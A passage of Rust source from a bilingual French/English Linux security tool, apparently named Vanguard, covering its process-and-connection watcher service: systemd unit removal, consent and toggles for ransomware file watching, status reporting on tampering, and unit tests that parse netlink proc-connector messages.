            "{} is no longer Vanguard's unit: kept as it is, nothing is stopped",
            crate::ui::chemin_affichable(chemin)
        ));
    }
    // Lu avant l'arrêt : le service le réécrit tant qu'il tourne, et il dit quel processus vérifier ensuite.
    let avant = lire_etat();
    // Couper le veilleur ne doit pas laisser un programme gelé : on dégèle ce qu'il avait gelé (« Reprendre »).
    if let Some(e) = &avant
        && !e.pids_geles.is_empty()
    {
        reponse::reprendre(&e.pids_geles);
    }
    let arrete = super::dbus::actions::utilisateur(super::dbus::actions::Geste::Desactiver { maintenant: true }, UNITE);
    let mut commandes = vec![format!("systemctl --user disable --now {UNITE}")];
    if a_nous {
        commandes.push(format!("{} {}", tr!("retirer", "remove"), chemin.display()));
        let _ = std::fs::remove_file(chemin);
    }
    commandes.push("systemctl --user daemon-reload".to_string());
    let _ = super::dbus::actions::utilisateur(super::dbus::actions::Geste::Recharger, "");
    let encore_la = a_nous && std::fs::symlink_metadata(chemin).is_ok();
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true);
    let tourne = avant.as_ref().filter(|e| en_marche(e)).map(|e| e.pid);
    let issue = if encore_la {
        Retire::Echoue(trf!(
            "unité encore là : {}",
            "unit still there: {}",
            crate::ui::chemin_affichable(chemin)
        ))
    } else if let Some(pid) = tourne {
        Retire::Echoue(trf!(
            "toujours en marche (processus {pid}) : systemctl --user stop {UNITE}",
            "still running (process {pid}): systemctl --user stop {UNITE}"
        ))
    } else if activee == Some(true) {
        Retire::Echoue(trf!(
            "toujours activée : systemctl --user disable {UNITE}",
            "still enabled: systemctl --user disable {UNITE}"
        ))
    } else if !arrete && presente {
        // Une unité absente rend disable en échec sans que rien ne tourne ; présente, l'échec veut dire que systemd
        // n'a pas répondu : rien ne la montre en marche, mais l'arrêt n'est pas confirmé.
        Retire::NonVerifie(
            tr!(
                "systemctl --user n'a pas confirmé l'arrêt ; aucun veilleur n'est vu en marche",
                "systemctl --user did not confirm the stop; no watcher is seen running"
            )
            .to_string(),
        )
    } else {
        Retire::Fait
    };
    oublier_le_choix(&issue, &crate::socle::dossier_local());
    crate::changements::noter(&[commandes], &[issue == Retire::Fait]);
    issue
}

/// Efface la note du choix et l'état du dossier `dossier`, seulement si rien ne reste. Un veilleur encore en marche
/// ou activé, privé de sa note, serait dit « coupé, comme par défaut » au bilan : le retrait raté compterait comme
/// fait. Gardés, le bilan dit l'écart (unité retirée mais voulue, service vivant). Le choix compte aussi pour la
/// désinstallation, qui peut garder le dossier de données.
///
/// L'arrêt est noté dans l'état scellé des défenses voulues (`voulues`), avec le geste au journal : seul lui fait dire
/// au bilan que le veilleur est coupé normalement. L'état du service part avec son sceau (effacé à la main, il se
/// dirait falsifié).
fn oublier_le_choix(issue: &Retire, dossier: &std::path::Path) {
    if !matches!(issue, Retire::Echoue(_)) {
        // L'arrêt d'abord, puis les marques : interrompu entre les deux, il reste une marque de trop (le veilleur se
        // dit voulu et absent), jamais des marques effacées sans arrêt noté. Une défense jamais notée n'a pas d'arrêt
        // à noter (la veille anti-rançongiciel jamais voulue).
        for d in [Defense::Veilleur, Defense::Rancongiciel]
            .into_iter()
            .filter(|d| voulues::souvenir_dans(dossier, *d) != voulues::Souvenir::Jamais)
        {
            if let Err(e) = voulues::noter_dans(dossier, d, false, true) {
                crate::modele::Echec::echoue("veilleur/oublier", e.to_string()).journaliser();
            }
        }
        let _ = std::fs::remove_file(dossier.join(VOULU));
        let _ = crate::sceau::effacer_dans(dossier, ETAT);
        let _ = std::fs::remove_file(dossier.join(RANCON_VOULU));
        crate::programmes_poses::oublier_dans(dossier, crate::programmes_poses::Tache::Veilleur);
    }
}

// ───────────────────────────── Commande, menu, bilan ─────────────────────────────

/// `vanguard veilleur [on|off]`, `vanguard veilleur rancongiciel [on|off]`, et le service lui-même (`--servir`).
pub(crate) fn commande(etat: Option<&str>, sous_etat: Option<&str>, servir: bool) {
    if servir {
        std::process::exit(self::servir());
    }
    if matches!(etat, Some("rancongiciel" | "ransomware")) {
        return commande_rancon(sous_etat);
    }
    titre(tr!(
        "Veilleur : lancements et connexions",
        "Watcher: launches and connections"
    ));
    match etat {
        Some("on") => allumer(),
        Some("off") => couper(),
        _ => {
            let c = constat();
            let signe = match c.probleme {
                None => format!("{VERT}✔{RESET} "),
                Some(n) => format!("{}⚠{RESET} ", couleur(n)),
            };
            afficher_aligne(&format!("  {signe}"), &c.message, 4, "");
            // La proposition inverse, seulement à quelqu'un qui peut répondre.
            if std::io::stdin().is_terminal() {
                println!();
                if crate::machine::linux::natif::unite_activee(UNITE, true) == Some(true) {
                    couper();
                } else {
                    allumer();
                }
            }
        }
    }
}

// ───────────────────────────── Accord de la veille anti-rançongiciel ─────────────────────────────

/// Le texte d'accord de la surveillance des fichiers (plan §5) : lu avant la question, dans la langue du bureau.
fn texte_accord_rancon() -> &'static str {
    tr!(
        "Le veilleur surveillera aussi vos dossiers personnels en direct. Il lit au plus 12 Kio des fichiers qui viennent d'être réécrits, en mémoire, pour voir s'ils sont chiffrés ; rien ne quitte cet ordinateur. Avec la protection active, il peut geler puis arrêter tout seul un rançongiciel quasi certain (jusqu'ici le veilleur n'arrêtait rien). Un programme malveillant de votre compte peut l'éteindre : ce n'est pas un rempart, votre sauvegarde reste la vraie protection.",
        "The watcher will also watch your personal folders live. It reads at most 12 KiB of files that were just rewritten, in memory, to see whether they are encrypted; nothing leaves this computer. With active protection, it can freeze then stop an almost certain ransomware by itself (until now the watcher stopped nothing). A malicious program in your account can switch it off: it is not a wall, your backup remains the real protection."
    )
}

/// Après l'allumage du veilleur, propose d'ajouter la surveillance des fichiers (point ouvert 6 : même « on »). À
/// quelqu'un qui peut répondre seulement.
fn proposer_rancon() {
    if rancon_voulu() || !std::io::stdin().is_terminal() {
        return;
    }
    println!();
    afficher_aligne("  ", texte_accord_rancon(), 2, "");
    if !demander(tr!(
        "\n  Surveiller aussi vos dossiers personnels contre les rançongiciels ? [o/N] : ",
        "\n  Also watch your personal folders against ransomware? [y/N]: "
    ))
    .oui()
    {
        trp!(
            "  La surveillance des fichiers reste coupée ; « vanguard veilleur rancongiciel on » l'allumera.",
            "  File watching stays off; “vanguard watcher ransomware on” will turn it on."
        );
        return;
    }
    activer_rancon();
}

/// Note le choix, propose les pièges s'il n'y en a pas, et redémarre le service pour qu'il prenne la surveillance.
fn activer_rancon() {
    marquer(&fichier_rancon_voulu());
    voulues::noter(Defense::Rancongiciel, true);
    let _ = super::dbus::actions::utilisateur(super::dbus::actions::Geste::RedemarrerSiActive, UNITE);
    trp!(
        "  {VERT}✔{RESET} Surveillance des fichiers allumée : une rafale de chiffrement vous alerte en quelques secondes.",
        "  {VERT}✔{RESET} File watching on: an encryption burst alerts you within seconds."
    );
    trp!(
        "  Limite : un programme qui écrit par un lien physique placé hors de ces dossiers échappe à cette veille ; les pièges restent vérifiés chaque heure.",
        "  Limit: a program writing through a hard link placed outside these folders escapes this watch; decoys are still checked hourly."
    );
    if crate::protection::pieges::chemins_poses().is_empty() {
        trp!(
            "  Aucun fichier-piège posé : « vanguard pieges » en pose (accord séparé) ; ils rendent l'arrêt automatique possible.",
            "  No decoy file placed: “vanguard decoys” places some (separate consent); they make the automatic stop possible."
        );
    }
}

/// `vanguard veilleur rancongiciel [on|off]`.
fn commande_rancon(sous_etat: Option<&str>) {
    titre(tr!("Veilleur : rançongiciels", "Watcher: ransomware"));
    match sous_etat {
        Some("on") => {
            if !voulu() && crate::machine::linux::natif::unite_activee(UNITE, true) != Some(true) {
                trp!(
                    "  Allume d'abord le veilleur : « vanguard veilleur on » (il propose la surveillance des fichiers).",
                    "  Turn the watcher on first: “vanguard watcher on” (it offers file watching)."
                );
                return;
            }
            if rancon_voulu() {
                trp!(
                    "  {VERT}✔{RESET} La surveillance des fichiers est déjà allumée.",
                    "  {VERT}✔{RESET} File watching is already on."
                );
                return;
            }
            afficher_aligne("  ", texte_accord_rancon(), 2, "");
            if demander(tr!("\n  Allumer ? [o/N] : ", "\n  Turn it on? [y/N]: ")).oui() {
                activer_rancon();
            } else {
                trp!("  Rien n'est changé.", "  Nothing is changed.");
            }
        }
        Some("off") => couper_rancon(),
        _ => {
            let etat = lire_etat();
            let message = if !rancon_voulu() {
                tr!(
                    "Surveillance des fichiers : coupée. « vanguard veilleur rancongiciel on » l'allume (le veilleur doit être allumé).",
                    "File watching: off. “vanguard watcher ransomware on” turns it on (the watcher must be on)."
                )
                .to_string()
            } else if let Some(e) = etat.filter(|e| vivant_d_apres(e, maintenant())) {
                trf!(
                    "Surveillance des fichiers : allumée. {} changement(s) vu(s), {} rafale(s), {} rançongiciel(s) arrêté(s).",
                    "File watching: on. {} change(s) seen, {} burst(s), {} ransomware stopped.",
                    e.rancon_changements,
                    e.rancon_rafales,
                    e.rancon_gels
                )
            } else {
                tr!(
                    "Surveillance des fichiers : voulue, mais le veilleur n'est pas vu en marche.",
                    "File watching: wanted, but the watcher is not seen running."
                )
                .to_string()
            };
            afficher_aligne("  ", &message, 4, "");
        }
    }
}

/// Coupe la surveillance des fichiers (dégèle ce qui restait gelé), puis redémarre le service.
fn couper_rancon() {
    if !rancon_voulu() {
        // Noté coupé par la personne : un état douteux ne se dit plus. Jamais voulue : rien à noter.
        if voulues::souvenir(Defense::Rancongiciel) != voulues::Souvenir::Jamais {
            voulues::noter(Defense::Rancongiciel, false);
        }
        trp!(
            "  {VERT}✔{RESET} La surveillance des fichiers est déjà coupée.",
            "  {VERT}✔{RESET} File watching is already off."
        );
        return;
    }
    if let Some(e) = lire_etat()
        && !e.pids_geles.is_empty()
    {
        reponse::reprendre(&e.pids_geles);
    }
    // L'arrêt noté avant que la marque ne parte (voir `oublier_le_choix`).
    voulues::noter(Defense::Rancongiciel, false);
    let _ = std::fs::remove_file(fichier_rancon_voulu());
    let _ = super::dbus::actions::utilisateur(super::dbus::actions::Geste::RedemarrerSiActive, UNITE);
    trp!(
        "  {VERT}✔{RESET} Surveillance des fichiers coupée (le veilleur continue d'observer lancements et connexions).",
        "  {VERT}✔{RESET} File watching off (the watcher keeps observing launches and connections)."
    );
}

fn precision_de(activee: Option<bool>, vivant: bool, pause: bool) -> &'static str {
    match (activee, vivant, pause) {
        (Some(true), true, true) => tr!("allumé, en pause (temps réel)", "on, paused (real-time off)"),
        (Some(true), true, false) => tr!("allumé", "on"),
        (Some(true), false, _) => tr!("allumé, à l'arrêt", "on, stopped"),
        _ => tr!("coupé", "off"),
    }
}

/// La précision de la ligne du menu : des fichiers lus, rien de lancé.
pub(crate) fn precision() -> &'static str {
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true);
    let vivant = lire_etat().is_some_and(|e| vivant_d_apres(&e, maintenant()));
    precision_de(activee, vivant, crate::protection::temps_reel::coupure().is_some())
}

/// Le constat du bilan.
///
/// Voulu ou non, c'est l'état scellé des défenses voulues qui le dit (`voulues`) ; vivant, c'est un état scellé
/// frais, et un processus qui lance le programme de l'unité, lui-même celui que Vanguard a posé (`programmes_poses`).
fn constat() -> Constat {
    use crate::voulues::Souvenir;
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true);
    let dossier = crate::socle::dossier_local();
    let (etat, doute_etat) = lire_etat_dans(&dossier);
    let maintenant = maintenant();
    let programme = programme_de_l_unite();
    let vivant = etat
        .as_ref()
        .is_some_and(|e| vivant_selon(e, maintenant, programme.as_deref()));
    let doute = doute_etat.or_else(|| {
        let e = etat.as_ref().filter(|e| frais(e, maintenant) && en_marche(e))?;
        match &programme {
            None => Some(
                tr!(
                    "son unité ne se lit pas, ou n'est plus celle de Vanguard",
                    "its unit cannot be read, or is no longer Vanguard's"
                )
                .to_string(),
            ),
            Some(p) if !lance_le_programme(e.pid, Some(p)) => Some(
                tr!(
                    "le processus noté ne lance pas le programme de l'unité : un autre programme, ou le veilleur d'avant une mise à jour",
                    "the noted process does not run the unit's program: another program, or the watcher from before an update"
                )
                .to_string(),
            ),
            Some(_) => None,
        }
    });
    let marque = fichier_voulu().is_file();
    let souvenir = voulues::souvenir(Defense::Veilleur);
    // Allumé sans la marque ou sans rien de noté (un dossier de Vanguard refait, une version d'avant) : le choix est
    // noté, sa disparition se verra.
    if activee == Some(true) && (!marque || souvenir == Souvenir::Jamais) {
        marquer(&fichier_voulu());
        voulues::adopter(Defense::Veilleur);
    }
    let verdict = voulues::juger(marque, activee == Some(true), &souvenir);
    let rancon_marque = fichier_rancon_voulu().is_file();
    // Allumée par une version d'avant : notée voulue, sa marque effacée ne la coupe plus en silence.
    if rancon_marque {
        voulues::adopter_d_avant_dans(&crate::socle::dossier_local(), Defense::Rancongiciel);
    }
    let rancon = voulues::juger(rancon_marque, false, &voulues::souvenir(Defense::Rancongiciel));
    // Le programme et l'unité comparés à ceux que Vanguard a posés : un autre programme ou une unité changée passe
    // avant tout ; un « non vérifié » s'ajoute au constat, sans cacher ce que dit l'état.
    let identite = match (activee, &programme) {
        (Some(true), Some(p)) => crate::programmes_poses::constat(
            crate::programmes_poses::Tache::Veilleur,
            p,
            &std::fs::read(fichier_unite()),
        ),
        _ => None,
    };
    if let Some(c) = identite.as_ref().filter(|c| c.probleme == Some(Niveau::Eleve)) {
        return c.clone();
    }
    if activee == Some(true)
        && let Some(pid) = ancien_veilleur(&dossier, programme.as_deref())
    {
        return juger_ancien(pid);
    }
    let noyau = release_du_noyau().and_then(|r| noyau_suffisant(&r));
    let mut c = juger_etat(
        &verdict,
        activee,
        etat.as_ref(),
        vivant,
        noyau,
        doute.as_deref(),
        &rancon,
    );
    if let Some(i) = identite {
        c.message.push(' ');
        c.message.push_str(&i.message);
        c.verifie &= i.verifie;
        c.probleme = c.probleme.max(i.probleme);
    }
    c
}

/// Le veilleur d'avant une mise à jour tourne encore (processus `pid`) : il voit toujours, mais avec l'ancien
/// programme, et il écrit son état comme avant (sans sceau, jusqu'à la 0.87). Ni « à l'arrêt », ni « falsifié » :
/// dit, avec le remède, jamais compté comme vérifié.
fn juger_ancien(pid: u32) -> Constat {
    Constat {
        verifie: false,
        ..alerte(
            "Surveillance",
            Niveau::Info,
            trf!(
                "Le veilleur tourne encore la version d'avant une mise à jour (processus {pid}) : il observe toujours, mais ce qu'il dit de lui n'est pas vérifié tant qu'il n'est pas relancé.",
                "The watcher still runs the version from before an update (process {pid}): it still watches, but what it says about itself is not checked until it is restarted."
            ),
        )
    }
    .manuel(
        tr!(
            "Le relancer : systemctl --user restart vanguard-veilleur (ou fermer puis rouvrir la session)",
            "Restart it: systemctl --user restart vanguard-veilleur (or sign out and back in)"
        ),
        &["systemctl --user restart vanguard-veilleur"],
    )
}

fn date(ts: i64) -> String {
    chrono::DateTime::from_timestamp(ts, 0).map_or_else(String::new, |d| {
        d.with_timezone(&chrono::Local).format("%d/%m %H:%M").to_string()
    })
}

/// L'état du veilleur au bilan, d'après ce qui a été lu : le choix (`voulues::juger` : marque, unité activée, état
/// scellé des défenses voulues), unité activée (`None` : pas de systemd de l'utilisateur), état écrit par le service,
/// service vivant, noyau assez récent, pourquoi l'état ou le processus ne peuvent pas être crus, et le choix de la
/// veille anti-rançongiciel.
fn juger_etat(
    voulu: &voulues::Verdict,
    activee: Option<bool>,
    etat: Option<&Etat>,
    vivant: bool,
    noyau: Option<bool>,
    doute: Option<&str>,
    rancon: &voulues::Verdict,
) -> Constat {
    use voulues::Verdict as V;
    const CAT: &str = "Surveillance";
    let Some(activee) = activee else {
        return impossible(
            CAT,
            tr!(
                "veilleur : systemd de l'utilisateur introuvable",
                "watcher: user systemd not found"
            ),
        );
    };
    match (activee, voulu, etat.filter(|_| vivant)) {
        (false, V::PasVoulue(quand), _) => {
            let mut texte = match quand {
                None => tr!(
                    "Veilleur des lancements et des connexions : coupé, comme par défaut ; « vanguard veilleur on » l'allume (Linux 6.6 et plus).",
                    "Watcher of launches and connections: off, as by default; “vanguard watcher on” turns it on (Linux 6.6 and later)."
                )
                .to_string(),
                Some(q) => trf!(
                    "Veilleur des lancements et des connexions : coupé par Vanguard le {q} ; « vanguard veilleur on » le rallume.",
                    "Watcher of launches and connections: turned off by Vanguard on {q}; “vanguard watcher on” turns it back on."
                ),
            };
            if noyau == Some(false) {
                texte.push(' ');
                texte.push_str(tr!(
                    "Ce noyau est plus ancien : il ne s'allumerait pas.",
                    "This kernel is older: it would not turn on."
                ));
            }
            ok(CAT, texte)
        }
        (false, V::CoupeeHors(depuis), _) => alerte(
            CAT,
            Niveau::Eleve,
            match depuis {
                Some(depuis) => trf!(
                    "Le veilleur que vous aviez allumé (le {depuis}) a été coupé sans passer par Vanguard : son unité est retirée ou désactivée, la trace de votre choix a disparu, et Vanguard n'a noté aucun arrêt. Un logiciel malveillant coupe d'abord ce qui le surveille.",
                    "The watcher you had turned on (on {depuis}) was cut without going through Vanguard: its unit is removed or disabled, the record of your choice disappeared, and Vanguard noted no stop. Malware first cuts what watches it."
                ),
                None => tr!(
                    "Le veilleur est coupé, et la note de Vanguard sur vos défenses a été modifiée ou effacée hors de Vanguard : un programme a pu le couper puis effacer ce qui le montrait. Un logiciel malveillant coupe d'abord ce qui le surveille.",
                    "The watcher is off, and Vanguard's record of your defenses was changed or deleted outside Vanguard: a program may have switched it off and then erased what showed it. Malware first cuts what watches it."
                )
                .to_string(),
            },
        )
        .manuel(
            tr!(
                "Le rallumer : vanguard veilleur on ; si c'est vous qui l'avez coupé, vanguard veilleur off pour que Vanguard le note",
                "Turn it back on: vanguard watcher on; if you turned it off yourself, vanguard watcher off so Vanguard notes it"
            ),
            &["vanguard veilleur on"],
        ),
        (false, V::NonVerifiee(d), _) => impossible(
            CAT,
            &trf!(
                "veilleur coupé, et la note de Vanguard sur vos défenses ({}) {} : rien ne montre que c'est vous qui l'avez coupé",
                "watcher off, and Vanguard's record of your defenses ({}) {}: nothing shows it was you who turned it off",
                voulues::FICHIER,
                d.texte()
            ),
        )
        .manuel(
            tr!(
                "vanguard veilleur on le rallume ; vanguard veilleur off note que vous n'en voulez pas",
                "vanguard watcher on turns it back on; vanguard watcher off notes that you do not want it"
            ),
            &[],
        ),
        (false, V::Voulue, _) => alerte(
            CAT,
            Niveau::Eleve,
            tr!(
                "Le veilleur que vous aviez allumé n'est plus activé : son unité a été retirée ou désactivée. Une mise à jour du système peut l'avoir fait ; un logiciel malveillant aussi, qui coupe d'abord ce qui le surveille.",
                "The watcher you had turned on is no longer enabled: its unit was removed or disabled. A system update may have done it; so may malware, which first cuts what watches it."
            ),
        )
        .manuel(
            tr!(
                "Le rallumer : vanguard veilleur on ; si c'est vous qui l'avez coupé, vanguard veilleur off pour que Vanguard l'oublie",
                "Turn it back on: vanguard watcher on; if you turned it off yourself, vanguard watcher off so Vanguard forgets it"
            ),
            &["vanguard veilleur on"],
        ),
        (true, _, Some(e)) => {
            let mut texte = trf!(
                "Veilleur allumé depuis le {} : {} lancement(s) vu(s), dont {} lu(s) en entier, {} par leur nom seul, {} parti(s) avant lecture (jamais comptés sains) et {} non lu(s) en rafale ; {} connexion(s) fermée(s).",
                "Watcher on since {}: {} launch(es) seen, of which {} read in full, {} by their name only, {} gone before reading (never counted safe) and {} not read in a burst; {} closed connection(s).",
                date(e.depuis),
                e.lancements,
                e.lus,
                e.noms_seuls,
                e.partis,
                e.non_lus,
                e.prises
            );
            let (mut rancon_manque, mut rancon_doute) = (false, false);
            let mut ajouter = |t: String| {
                texte.push(' ');
                texte.push_str(&t);
            };
            if e.non_haches > 0 {
                ajouter(trf!(
                    "{} programme(s) non haché(s) à temps (un fichier qui ne répond pas) : leur empreinte n'est pas vérifiée.",
                    "{} program(s) not hashed in time (a file that does not respond): their fingerprint is not checked.",
                    e.non_haches
                ));
            }
            if e.sans_programme > 0 {
                ajouter(trf!(
                    "Parmi les lus en entier, {} d'un autre compte jugé(s) sur leur ligne de commande seule : leur programme ne se lit pas sans droits, et le dossier d'où il part n'est pas vérifié.",
                    "Among those read in full, {} from another account judged on their command line only: their program cannot be read without rights, and the folder it starts from is not checked.",
                    e.sans_programme
                ));
            }
            if e.en_pause {
                ajouter(
                    tr!(
                        "En pause : la protection en temps réel est coupée, rien n'est noté ni notifié.",
                        "Paused: real-time protection is off, nothing is noted or notified."
                    )
                    .to_string(),
                );
            }
            if e.perdus > 0 {
                ajouter(trf!(
                    "{} débordement(s) du tampon : des événements perdus, non vérifiés.",
                    "{} buffer overrun(s): events lost, not checked.",
                    e.perdus
                ));
            }
            if let Some(l) = &e.listes {
                ajouter(trf!(
                    "Connexions jugées en partie : {l}.",
                    "Connections partly judged: {l}."
                ));
            }
            if let Some(p) = &e.sans_prises {
                ajouter(trf!(
                    "Connexions fermées non vues : {p}",
                    "Closed connections not seen: {p}"
                ));
            }
            if e.masque {
                ajouter(
                    tr!(
                        "/proc ne montre que vos programmes (hidepid) : ceux des autres comptes comptent parmi les partis.",
                        "/proc only shows your programs (hidepid): those of other accounts count among the gone ones."
                    )
                    .to_string(),
                );
            }
            // La veille anti-rançongiciel : son état, ses rafales, les rançongiciels arrêtés.
            if e.rancon_actif {
                ajouter(trf!(
                    "Veille anti-rançongiciel allumée : {} changement(s) de fichiers vu(s), {} rafale(s), {} rançongiciel(s) arrêté(s).",
                    "Ransomware watch on: {} file change(s) seen, {} burst(s), {} ransomware stopped.",
                    e.rancon_changements,
                    e.rancon_rafales,
                    e.rancon_gels
                ));
            } else if let Some(r) = &e.rancon_sans {
                ajouter(trf!(
                    "Veille anti-rançongiciel voulue mais inactive : {r}.",
                    "Ransomware watch wanted but inactive: {r}."
                ));
            } else if matches!(rancon, V::Voulue | V::CoupeeHors(_)) {
                // Voulue, notée, et pourtant pas en marche : le service a démarré sans la voir voulue (sa note effacée
                // hors de Vanguard, par exemple). Jamais tu : c'est elle qui arrête un rançongiciel.
                rancon_manque = true;
                ajouter(
                    tr!(
                        "Veille anti-rançongiciel voulue, mais pas en marche dans le veilleur : sa note a pu être effacée hors de Vanguard. systemctl --user restart vanguard-veilleur la reprend.",
                        "Ransomware watch wanted, but not running in the watcher: its note may have been deleted outside Vanguard. systemctl --user restart vanguard-veilleur resumes it."
                    )
                    .to_string(),
                );
            } else if let V::NonVerifiee(d) = rancon {
                rancon_doute = true;
                ajouter(trf!(
                    "Veille anti-rançongiciel coupée, et la note de Vanguard sur vos défenses {} : rien ne montre que c'est vous qui l'avez coupée (vanguard veilleur rancongiciel on la rallume, off le note).",
                    "Ransomware watch off, and Vanguard's record of your defenses {}: nothing shows it was you who turned it off (vanguard watcher ransomware on turns it back on, off notes it).",
                    d.texte()
                ));
            }
            if !e.pids_geles.is_empty() {
                ajouter(trf!(
                    "{} programme(s) resté(s) gelé(s) : vanguard veilleur rancongiciel off les reprend.",
                    "{} program(s) left frozen: vanguard watcher ransomware off resumes them.",
                    e.pids_geles.len()
                ));
            }
            // En pause, sans fins de prises, avec des pertes ou des listes manquantes : une partie n'est pas vérifiée.
            // Le signe n'est donc pas vert (la note ne change pas), comme pour la protection en temps réel coupée.
            if rancon_manque {
                alerte(CAT, Niveau::Moyen, texte)
            } else if rancon_doute {
                Constat {
                    verifie: false,
                    ..alerte(CAT, Niveau::Info, texte)
                }
            } else if e.en_pause || e.sans_prises.is_some() || e.perdus > 0 || e.listes.is_some() {
                alerte(CAT, Niveau::Info, texte)
            } else {
                ok(CAT, texte)
            }
        }
        (true, _, None) => {
            let raison = doute
                .or_else(|| etat.and_then(|e| e.raison_arret.as_deref()))
                .map(|r| format!(" ({r})"))
                .unwrap_or_default();
            Constat {
                verifie: false,
                ..alerte(
                    CAT,
                    Niveau::Moyen,
                    trf!(
                        "Veilleur allumé mais à l'arrêt{raison} : non vérifié, rien n'est vu en ce moment.",
                        "Watcher on but stopped{raison}: not checked, nothing is seen right now."
                    ),
                )
            }
            .manuel(
                tr!(
                    "Le relancer : vanguard veilleur on ; journalctl --user -u vanguard-veilleur dit pourquoi il s'est arrêté",
                    "Start it again: vanguard watcher on; journalctl --user -u vanguard-veilleur tells why it stopped"
                ),
                &["vanguard veilleur on"],
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;
    use std::net::{Ipv4Addr, Ipv6Addr};

    // Les octets du noyau, écrits à la main dans l'ordre de cette machine.

    fn entete(longueur: usize, genre: u16) -> Vec<u8> {
        let mut o = Vec::new();
        o.extend_from_slice(&u32::try_from(longueur).unwrap().to_ne_bytes());
        o.extend_from_slice(&genre.to_ne_bytes());
        o.extend_from_slice(&[0; 10]);
        o
    }

    /// Un message du connecteur : cn_msg (idx, val, seq, ack, longueur) puis proc_event (what, cpu, horodatage,
    /// données de 24 octets).
    fn message_proc(idx: u32, seq: u32, ack: u32, what: u32, donnees: [u32; 6]) -> Vec<u8> {
        let mut corps = Vec::new();
        for v in [idx, CN_VAL_PROC, seq, ack] {
            corps.extend_from_slice(&v.to_ne_bytes());
        }
        corps.extend_from_slice(&40u16.to_ne_bytes());
        corps.extend_from_slice(&0u16.to_ne_bytes());
        corps.extend_from_slice(&what.to_ne_bytes());
        corps.extend_from_slice(&3u32.to_ne_bytes());
        corps.extend_from_slice(&123_456_789u64.to_ne_bytes());
        for v in donnees {
            corps.extend_from_slice(&v.to_ne_bytes());
        }
        let mut o = entete(16 + corps.len(), NLMSG_DONE);
        o.extend(corps);
        assert_eq!(o.len(), 76);
        o
    }

    #[test]
    fn accuse_de_notre_abonnement() {
        // Le seq de l'accusé est le compteur du noyau (0x10ca), pas le nôtre : seul ack = jeton + 1 compte.
        let jeton = 0x8000_1234;
        let o = message_proc(1, 0x10ca, jeton + 1, PROC_EVENT_NONE, [0; 6]);
        let e = lire_evenements_proc(&o);
        assert_eq!(
            e,
            [EvenementProc::Accuse {
                seq: 0x10ca,
                ack: jeton + 1,
                err: 0
            }]
        );
        assert_eq!(notre_accuse(&e[0], jeton), Some(0));
        let refuse = lire_evenements_proc(&message_proc(1, 7, jeton + 1, PROC_EVENT_NONE, [1, 0, 0, 0, 0, 0]));
        assert_eq!(notre_accuse(&refuse[0], jeton), Some(1));
        // L'accusé d'un autre abonné (ack = 1, ou un autre jeton) ne prouve rien.
        for ack in [1, jeton, jeton + 2] {
            let etranger = lire_evenements_proc(&message_proc(1, 0x10cb, ack, PROC_EVENT_NONE, [0; 6]));
            assert_eq!(notre_accuse(&etranger[0], jeton), None);
        }
        let lancement = lire_evenements_proc(&message_proc(1, 0, jeton + 1, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0]));
        assert_eq!(notre_accuse(&lancement[0], jeton), None);
        assert!(jeton_d_abonnement() >= 0x8000_0000 && jeton_d_abonnement() < u32::MAX);
    }

    #[test]
    fn fourche_lancement_fin_et_fils_ignores() {
        let fourche = message_proc(1, 0, 0, PROC_EVENT_FORK, [100, 100, 200, 200, 0, 0]);
        let fil = message_proc(1, 0, 0, PROC_EVENT_FORK, [100, 100, 201, 200, 0, 0]);
        let lancement = message_proc(1, 0, 0, PROC_EVENT_EXEC, [200, 200, 0, 0, 0, 0]);
        let fin = message_proc(1, 0, 0, PROC_EVENT_EXIT, [200, 200, 0, 17, 100, 100]);
        let fin_de_fil = message_proc(1, 0, 0, PROC_EVENT_EXIT, [201, 200, 0, 17, 100, 100]);
        assert_eq!(
            lire_evenements_proc(&fourche),
            [EvenementProc::Fourche {
                parent: 100,
                enfant: 200
            }]
        );
        assert_eq!(lire_evenements_proc(&fil), [EvenementProc::Autre]);
        assert_eq!(
            lire_evenements_proc(&lancement),
            [EvenementProc::Lancement { pid: 200 }]
        );
        assert_eq!(
            lire_evenements_proc(&fin),
            [EvenementProc::Fin {
                pid: 200,
                parent: Some(100),
                code: 0
            }]
        );
        assert_eq!(lire_evenements_proc(&fin_de_fil), [EvenementProc::Autre]);
    }

    #[test]
    fn plusieurs_messages_et_messages_abimes() {
        let mut tampon = message_proc(1, 0, 0, PROC_EVENT_EXEC, [1, 1, 0, 0, 0, 0]);
        tampon.extend(message_proc(1, 0, 0, PROC_EVENT_EXEC, [2, 2, 0, 0, 0, 0]));
        assert_eq!(
            lire_evenements_proc(&tampon),
            [EvenementProc::Lancement { pid: 1 }, EvenementProc::Lancement { pid: 2 }]
        );
        let bon = message_proc(1, 0, 0, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0]);
        // Tronqué : la longueur annoncée dépasse ce qui est là.
        assert_eq!(lire_evenements_proc(&bon[..60]), []);
        // Un autre connecteur (idx ≠ 1).
        assert_eq!(
            lire_evenements_proc(&message_proc(2, 0, 0, PROC_EVENT_EXEC, [3, 3, 0, 0, 0, 0])),
            []
        );
        // Un autre type de message netlink.
        let mut autre = bon.clone();
        autre[4..6].copy_from_slice(&2u16.to_ne_bytes());
        assert_eq!(lire_evenements_proc(&autre), []);
        // Des données plus longues que le message.
        let mut trop = bon;
        trop[32..34].copy_from_slice(&200u16.to_ne_bytes());
        assert_eq!(lire_evenements_proc(&trop), []);
    }

    #[test]
    fn evenements_sans_interet() {
        for what in [4, 0x40, 0x200, 0x4000_0000] {
            assert_eq!(
                lire_evenements_proc(&message_proc(1, 0, 0, what, [5, 5, 0, 0, 0, 0])),
                [EvenementProc::Autre]
            );
        }
    }

    #[test]
    fn demandes_d_abonnement_exactes() {
        let ecouter = demande_abonnement(PROC_CN_MCAST_LISTEN, 0x0102_0304);
        let mut attendu = 40u32.to_ne_bytes().to_vec();
        attendu.extend_from_slice(&3u16.to_ne_bytes());
        attendu.extend_from_slice(&0u16.to_ne_bytes());
        for v in [0x0102_0304u32, 0, 1, 1, 0x0102_0304, 0x0102_0304] {
            attendu.extend_from_slice(&v.to_ne_bytes());
        }
        attendu.extend_from_slice(&4u16.to_ne_bytes());
        attendu.extend_from_slice(&0u16.to_ne_bytes());
        attendu.extend_from_slice(&1u32.to_ne_bytes());
        assert_eq!(ecouter.to_vec(), attendu);
